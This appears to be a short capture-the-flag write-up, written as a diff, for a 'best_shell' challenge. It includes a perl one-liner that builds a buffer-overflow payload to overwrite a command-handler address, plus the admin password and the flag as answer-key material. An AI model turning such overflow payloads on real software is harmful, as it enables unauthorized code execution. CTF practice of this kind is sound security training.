@@ -1,0 +1,17 @@
+Problem:
+
+This shell is super useful! See if you can get the flag! The binary can be found at /home/best_shell/ on the shell server. The source can be downloaded here.
+
+Notes:
+
+Can overwrite the internal structure of input_handler
+Use to overwrite the address of the command handler
+
+perl -e 'print "rename shell " . "A"x32 . "\xd7\x89\x04\x08" . "\n" . "A"x32 ."\xd7\x89\x04\x08" . "\n"' > ~/test.txt
+cat ~/test.txt | ./best_flag
+
+Admin password: fbc3799d2e3f1739
+
+Flag:
+
+give_shell_was_useful
